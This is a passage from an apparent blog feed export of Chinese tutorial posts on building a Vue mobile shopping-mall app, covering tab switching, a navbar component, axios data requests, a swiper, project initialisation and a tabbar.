class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><p>这里主要有几个css的新知识点（或者遗忘点）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*  显示省略符号来代表被修剪的文本 */</span></span><br><span class="line"><span class="selector-tag">text-overflow</span>: <span class="selector-tag">ellipsis</span>;</span><br><span class="line"><span class="comment">/* 文本不换行 */</span></span><br><span class="line"><span class="selector-tag">white-space</span>: <span class="selector-tag">nowrap</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 包裹 在子组件定义宽度后，可以根据宽度自动排列布局*/</span></span><br><span class="line"><span class="selector-tag">flex-wrap</span>: <span class="selector-tag">wrap</span>;</span><br><span class="line"><span class="comment">/* 可以使子组件的间距均匀 */</span></span><br><span class="line"><span class="selector-tag">justify-content</span>: <span class="selector-tag">space-around</span>;</span><br></pre></td></tr></table></figure><h2 id="tabcontrol切换商品类型"><a href="#tabcontrol切换商品类型" class="headerlink" title="tabcontrol切换商品类型"></a>tabcontrol切换商品类型</h2><p>回到tabcontrol，我们需要通过点击事件来切换不同的商品展示，所以这里就要动态绑定点击事件，同时，为了触发父组件的goods信息改变，我们需要将该事件点击所对应的tab的索引传给父组件</p><p>动态绑定事件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-for</span>=<span class="string">"(item,index) in titles"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">class</span>=<span class="string">"tab-control-item"</span></span></span><br><span class="line"><span class="tag"><span class="attr">:class</span> = <span class="string">"&#123;active: index === currentIndex&#125;"</span></span></span><br><span class="line"><span class="tag">@<span class="attr">click</span>=<span class="string">"itemchange(index)"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>传出事件以及当前点击的索引</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">methods: &#123;</span><br><span class="line">  itemchange(index) &#123;</span><br><span class="line">    <span class="keyword">this</span>.currentIndex = index</span><br><span class="line">    <span class="keyword">this</span>.$emit(<span class="string">'tabClick'</span>, index)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>父组件接收点击事件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tab-control</span> <span class="attr">:titles</span>=<span class="string">"['流行', '新款', '精选']"</span> <span class="attr">class</span>=<span class="string">"tab"</span> @<span class="attr">tabClick</span>=<span class="string">"tabClick"</span>&gt;</span><span class="tag">&lt;/<span class="name">tab-control</span>&gt;</span></span><br></pre></td></tr></table></figure><p>用一个变量获得当前请求的数据索引（默认首页）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data () &#123;</span><br><span class="line">    currentType: <span class="string">'pop'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>处理该事件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">methods: &#123;</span><br><span class="line">  <span class="comment">//首页数据处理</span></span><br><span class="line">  tabClick(index) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (index) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">this</span>.currentType = <span class="string">'pop'</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">this</span>.currentType = <span class="string">'new'</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">this</span>.currentType = <span class="string">'sell'</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再在computed中，动态改变当前请求的数据索引</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">computed: &#123;</span><br><span class="line">  showGoods() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.goods[<span class="keyword">this</span>.currentType].list</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在标签，动态绑定数据</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">goods-list</span> <span class="attr">:goods</span>=<span class="string">"showGoods"</span>&gt;</span><span class="tag">&lt;/<span class="name">goods-list</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样就OK啦</p>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
            <tag> Vue移动端商城 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2.首页上</title>
      <link href="/2021/03/02/2.%E9%A6%96%E9%A1%B5%E4%B8%8A/"/>
      <url>/2021/03/02/2.%E9%A6%96%E9%A1%B5%E4%B8%8A/</url>
      
        <content type="html"><![CDATA[<h2 id="首页导航栏的封装（navbar）"><a href="#首页导航栏的封装（navbar）" class="headerlink" title="首页导航栏的封装（navbar）"></a>首页导航栏的封装（navbar）</h2><p>因为导航栏的通用性，在其它项目中可能可以用到，所以我们把它封装到components中的common里面去，命名为NavBar.vue</p><p>因为导航栏可能因为内容的改变而会有不同位置出现不同的内容，所以我们为其定义三个插槽，分别为左中右，同时定义样式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;nav-bar&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;left&quot;&gt;</span><br><span class="line">      &lt;slot name&#x3D;&quot;left&quot;&gt;&lt;&#x2F;slot&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;center&quot;&gt;</span><br><span class="line">      &lt;slot name&#x3D;&quot;center&quot;&gt;&lt;&#x2F;slot&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;right&quot;&gt;</span><br><span class="line">      &lt;slot name&#x3D;&quot;right&quot;&gt;&lt;&#x2F;slot&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  export default &#123;</span><br><span class="line">    name: &quot;NavBar&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">  .nav-bar &#123;</span><br><span class="line">    height: 44px;</span><br><span class="line">    display: flex;</span><br><span class="line">    text-align: center;</span><br><span class="line">    line-height: 44px;</span><br><span class="line">    box-shadow: 0 1px 1px rgba(100,100,100,.1)</span><br><span class="line">  &#125;</span><br><span class="line">  .center &#123;</span><br><span class="line">    flex: 1;</span><br><span class="line">  &#125;</span><br><span class="line">  .right, .left &#123;</span><br><span class="line">    width: 60px;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><p>接着，当然就是在首页引用该组件啦，在首页导入该组件，同时在插槽处添加所需加的内容，然后就是样式的相关修改了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div id&#x3D;&quot;home&quot;&gt;</span><br><span class="line">    &lt;nav-bar class&#x3D;&quot;home-nav&quot;&gt;</span><br><span class="line">      &lt;div slot&#x3D;&quot;center&quot;&gt;购物街&lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;nav-bar&gt;&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  import NavBar from &#39;components&#x2F;common&#x2F;navbar&#x2F;NavBar.vue&#39;</span><br><span class="line"></span><br><span class="line">  export default &#123;</span><br><span class="line">    name:&#39;Home&#39;,</span><br><span class="line">    components: &#123;</span><br><span class="line">      NavBar</span><br><span class="line">    &#125;,</span><br><span class="line">    data () &#123;</span><br><span class="line">      return&#123;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    created() &#123;</span><br><span class="line">    &#125;,</span><br><span class="line">    computed: &#123;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">  #home &#123;</span><br><span class="line">    padding-top: 44px;</span><br><span class="line">    position: relative;</span><br><span class="line">  &#125;</span><br><span class="line">  .home-nav &#123;</span><br><span class="line">    position: fixed;</span><br><span class="line">    top: 0;</span><br><span class="line">    left: 0;</span><br><span class="line">    right: 0;</span><br><span class="line">    color: white;</span><br><span class="line">    z-index: 10;</span><br><span class="line">    background-color: var(--color-tint);</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><h2 id="请求首页的多个数据"><a href="#请求首页的多个数据" class="headerlink" title="请求首页的多个数据"></a>请求首页的多个数据</h2><p>请求，就意味着我们需要书写网络请求相关代码了，安装axios插件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i axios --save</span><br></pre></td></tr></table></figure><p>来到network下新建home.js文件，作为统一的网络请求</p><p>引入相关模块，并导出网络请求，使用函数getHomeMultidata封装该请求</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;request&#125; <span class="keyword">from</span> <span class="string">'./request.js'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">getHomeMultidata</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> request(&#123;</span><br><span class="line">    url: <span class="string">'/home/multidata'</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着，在Home组件中，在其被创建（create）时加入该网络请求</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;getHomeMultidata, getHomeGoods&#125; <span class="keyword">from</span> <span class="string">'network/home.js'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">   name:<span class="string">'Home'</span>,</span><br><span class="line">   created() &#123;</span><br><span class="line">      getHomeMultidata().then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">         <span class="keyword">this</span>.banners = res.data.banner.list</span><br><span class="line">         <span class="keyword">this</span>.recommends = res.data.recommend.list</span><br><span class="line">      &#125;)</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>定义一个data数据用来存储请求返回得到的数据（熟悉垃圾回收）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data () &#123;</span><br><span class="line">  <span class="keyword">return</span>&#123;</span><br><span class="line">    banners: [],</span><br><span class="line">    recommends: []</span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h2 id="轮播图（swiper）"><a href="#轮播图（swiper）" class="headerlink" title="轮播图（swiper）"></a>轮播图（swiper）</h2><p>轮播图的制作后面要补上（vue实现）</p><p>这里根据设计图，将首页再次划分成几大模块</p><p><img src= "/img/loading.gif" data-src="/2021/03/02/2.%E9%A6%96%E9%A1%B5%E4%B8%8A/image-20201113204620367.png" alt="image-20201113204620367"></p><p>好吧，图有点丑，但不妨碍理解，这里，我们最终要呈现的是swiper这个大的组件，所以，为了让首页的逻辑更加清晰点，我们只定义上述图中的组件，而每个组件的内部实现，则由各自的组件去实现</p><p>所以，我们在home文件夹下新建childComps文件夹，新建HomeSwiper.vue，用来封装swiper相关组件</p><p>在HomeSwiper里，引入两个swiper相关模块并设置样式，好的，到这里，你就会发现父组件的数据咋办，是的，用props</p><p>HomeSwiper.vue</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">props: &#123;</span><br><span class="line">  banners: &#123;</span><br><span class="line">    type: <span class="built_in">Array</span>,</span><br><span class="line">    <span class="keyword">default</span>() &#123;</span><br><span class="line">      <span class="keyword">return</span> []</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Home.vue</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;home-swiper :banners&#x3D;&#39;banners&#39;&gt;&lt;&#x2F;home-swiper&gt;</span><br></pre></td></tr></table></figure><p>ok,放出HomeSwiper全部代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;swiper&gt;</span><br><span class="line">    &lt;swiper-item v-for&#x3D;&quot;(item,index) in banners&quot;&gt;</span><br><span class="line">      &lt;a :href&#x3D;&quot;item.link&quot;&gt;</span><br><span class="line">        &lt;img :src&#x3D;&quot;item.image&quot; alt&#x3D;&quot;&quot;&gt;</span><br><span class="line">      &lt;&#x2F;a&gt;</span><br><span class="line">    &lt;&#x2F;swiper-item&gt;</span><br><span class="line">  &lt;&#x2F;swiper&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import &#123; Swiper, SwiperItem &#125; from &#39;components&#x2F;common&#x2F;swiper&#x2F;index.js&#39;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &#39;HomeSwiper&#39;,</span><br><span class="line">  props: &#123;</span><br><span class="line">    banners: &#123;</span><br><span class="line">      type: Array,</span><br><span class="line">      default() &#123;</span><br><span class="line">        return []</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  components: &#123;</span><br><span class="line">    Swiper,</span><br><span class="line">    SwiperItem</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><h2 id="推荐信息的展示"><a href="#推荐信息的展示" class="headerlink" title="推荐信息的展示"></a>推荐信息的展示</h2><p>这里没啥可说的，主要是用到v-for去展示推荐信息，直接看源码（HomeRecommend）</p><h2 id="FeatureView的实现"><a href="#FeatureView的实现" class="headerlink" title="FeatureView的实现"></a>FeatureView的实现</h2><p>这个更简单，案例直接写死了，直接放代码</p><h2 id="TabControl"><a href="#TabControl" class="headerlink" title="TabControl"></a>TabControl</h2><p>和推荐信息一个道理，没啥好说，最多就是样式上的修改</p><p>这里有一个重点说一下，其他直接看源码就可，在home.vue，为了实现tabControl吸顶效果，这里要使用到css一个属性<code>position: sticky</code></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.tab-control</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: sticky;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">43px</span>;</span><br><span class="line">  <span class="attribute">z-index</span>: <span class="number">10</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
            <tag> Vue移动端商城 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1.项目初始工作</title>
      <link href="/2021/03/02/1.%E9%A1%B9%E7%9B%AE%E5%88%9D%E5%A7%8B%E5%B7%A5%E4%BD%9C/"/>
      <url>/2021/03/02/1.%E9%A1%B9%E7%9B%AE%E5%88%9D%E5%A7%8B%E5%B7%A5%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<p>vue移动端商城案例的搭建一共写了13个篇（因为内容实在太多，但是分开每一节会很少），从首页、详情页到购物车三部分入手，其中包括一些bug的解决、比如解决移动端300ms延迟、封装的思想，还有vue的图片懒加载还有css单位的转换，和最后项目的部署，项目部署我写了有三种方式，后面有空会尝试将个人主页这一部分加入，代码<a href="https://github.com/Dong-666/vue-mall" target="_blank" rel="noopener">地址</a>，如果对你的学习有帮助的话希望多多支持点个star，也欢迎指出不足还有错误的地方。</p><p>本案例是基于<a href="https://www.bilibili.com/video/BV15741177Eh?p=1" target="_blank" rel="noopener">B站</a>学习<br>下面首先就是项目初始工作</p><h1 id="git仓库初始化"><a href="#git仓库初始化" class="headerlink" title="git仓库初始化"></a>git仓库初始化</h1><p>这里，有两种方案去git自己的项目，一个是在创建好项目文件夹后，连接到事先创建好的git仓库并push，另外一种是在创建好git仓库后，在本地文件夹下clone并创建自己的项目</p><p>这里说一下第一种方法</p><ol><li><p>首先就是新建一个仓库了</p><p><img src= "/img/loading.gif" data-src="/2021/03/02/1.%E9%A1%B9%E7%9B%AE%E5%88%9D%E5%A7%8B%E5%B7%A5%E4%BD%9C/image-20201107092007943.png" alt="image-20201107092007943"></p></li><li><p>然后就是用脚手架创建vue项目，接着在根目录<code>git bash</code></p><p><img src= "/img/loading.gif" data-src="/2021/03/02/1.%E9%A1%B9%E7%9B%AE%E5%88%9D%E5%A7%8B%E5%B7%A5%E4%BD%9C/image-20201107092547493.png" alt="image-20201107092547493"></p></li><li><p>执行下面代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git remote add origin git@github.com:Dong-666/vue-te.git</span><br><span class="line">git branch -M main</span><br><span class="line">git push -u origin main</span><br></pre></td></tr></table></figure></li></ol><p>ok，项目以及仓库都初始化完成</p><h1 id="划分目录结构"><a href="#划分目录结构" class="headerlink" title="划分目录结构"></a>划分目录结构</h1><p><strong>src下的目录结构</strong></p><ul><li>network （网络模块）→相关网络请求（axios）</li><li>components （组件）<ul><li>common （公共模块）→可以多项目复用</li><li>content （业务模块）→该项目可以复用</li></ul></li><li>views （路由页面模块）</li><li>common  （公共js文件–常量…）</li><li>assets （静态资源）</li><li>router （路由）→页面跳转</li><li>store （vuex状态管理）</li></ul><h1 id="设置CSS初始化和全局样式"><a href="#设置CSS初始化和全局样式" class="headerlink" title="设置CSS初始化和全局样式"></a>设置CSS初始化和全局样式</h1><p>适应不同浏览器端对页面的适配以及设置好项目的主题颜色</p><p>css样式初始化：<a href="https://github.com/necolas/normalize.css/" target="_blank" rel="noopener">normalize.css</a></p><p>主题颜色以及css常量设置：base.css</p><h1 id="路径别名以及代码风格设置"><a href="#路径别名以及代码风格设置" class="headerlink" title="路径别名以及代码风格设置"></a>路径别名以及代码风格设置</h1><p>在项目根目录下创建一个vue.config.js文件，并填入相关配置</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  configureWebpack: &#123;</span><br><span class="line">    resolve: &#123;</span><br><span class="line">      alias: &#123;</span><br><span class="line">        <span class="string">'assets'</span>: <span class="string">'@/assets'</span>,</span><br><span class="line">        <span class="string">'common'</span>: <span class="string">'@/common'</span>,</span><br><span class="line">        <span class="string">'components'</span>: <span class="string">'@/components'</span>,</span><br><span class="line">        <span class="string">'network'</span>: <span class="string">'@/network'</span>,</span><br><span class="line">        <span class="string">'views'</span>: <span class="string">'@/views'</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从项目代码规范方引入<code>.editorconfig</code>文件，代码不摆了，每个项目有各自的风格</p><p><strong>举例</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root &#x3D; true</span><br><span class="line"></span><br><span class="line">[*]</span><br><span class="line">charset &#x3D; utf-8</span><br><span class="line">indent_style &#x3D; space</span><br><span class="line">indent_size &#x3D; 2</span><br><span class="line">end_of_line &#x3D; lf</span><br><span class="line">insert_final_newline &#x3D; true</span><br><span class="line">trim_trailing_whitespace &#x3D; true</span><br></pre></td></tr></table></figure><h1 id="tabbar引入以及模块划分（项目结构初始化）"><a href="#tabbar引入以及模块划分（项目结构初始化）" class="headerlink" title="tabbar引入以及模块划分（项目结构初始化）"></a>tabbar引入以及模块划分（项目结构初始化）</h1><p>将之前创建好的tabbar模块引入，方法同之前tabbar项目，并将首页等各<strong>view文件夹和页面html</strong>创建出来，<strong>路由表</strong>的创建等，注意<strong>路径</strong></p><h1 id="更换图标"><a href="#更换图标" class="headerlink" title="更换图标"></a>更换图标</h1><p>在pubic文件夹下的index.html文件中有下列代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"icon"</span> <span class="attr">href</span>=<span class="string">"&lt;%= BASE_URL %&gt;favicon.ico"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中，它利用了正则表达式去获取图标位置（知识待补充）</p><p>我们只需将同级目录下的favicon.ico文件替换成自己的图标即可</p>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
            <tag> Vue移动端商城 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tabbar制作</title>
      <link href="/2021/03/01/vue%E5%AE%9E%E7%8E%B0tabbar/"/>
      <url>/2021/03/01/vue%E5%AE%9E%E7%8E%B0tabbar/</url>
      
        <content type="html"><![CDATA[<blockquote><p>基于CLI学完后所做的第一个较大的vue案例</p></blockquote><h1 id="0-思路"><a href="#0-思路" class="headerlink" title="0.思路"></a>0.思路</h1><ol><li>在App.vue中搭建大致的底部栏样式</li><li>拆解底部栏（大框+切换选项）</li><li>创建路由</li><li>实现动态切换路由（v-on）</li><li>实现动态切换样式（v-bind、props、computed、$route、$router）</li><li>整合底部栏并抽离出一个完整的底部栏组件，并在app.vue导入该完整的底部栏组件</li></ol><h1 id="1-结构搭建"><a href="#1-结构搭建" class="headerlink" title="1.结构搭建"></a>1.结构搭建</h1><p>首先，就是在app.vue里面将大致结构搭建出来</p><p>template代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class&#x3D;&quot;tab-bar&quot;&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;tab-item&quot;&gt;</span><br><span class="line">    &lt;img src&#x3D;&quot;..&#x2F;..&#x2F;assets&#x2F;image&#x2F;tabbar&#x2F;home.svg&quot; alt&#x3D;&quot;&quot; slot&#x3D;&quot;image&quot;&gt;</span><br><span class="line">    &lt;img src&#x3D;&quot;..&#x2F;..&#x2F;assets&#x2F;image&#x2F;tabbar&#x2F;home_active.svg&quot; alt&#x3D;&quot;&quot; slot&#x3D;&quot;img-active&quot;&gt;</span><br><span class="line">    &lt;div slot&#x3D;&quot;item&quot;&gt;首页&lt;&#x2F;div&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;tab-item&quot;&gt;</span><br><span class="line">    &lt;img src&#x3D;&quot;..&#x2F;..&#x2F;assets&#x2F;image&#x2F;tabbar&#x2F;home.svg&quot; alt&#x3D;&quot;&quot; slot&#x3D;&quot;image&quot;&gt;</span><br><span class="line">    &lt;img src&#x3D;&quot;..&#x2F;..&#x2F;assets&#x2F;image&#x2F;tabbar&#x2F;home_active.svg&quot; alt&#x3D;&quot;&quot; slot&#x3D;&quot;img-active&quot;&gt;</span><br><span class="line">    &lt;div slot&#x3D;&quot;item&quot;&gt;首页&lt;&#x2F;div&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;tab-item&quot;&gt;</span><br><span class="line">    &lt;img src&#x3D;&quot;..&#x2F;..&#x2F;assets&#x2F;image&#x2F;tabbar&#x2F;home.svg&quot; alt&#x3D;&quot;&quot; 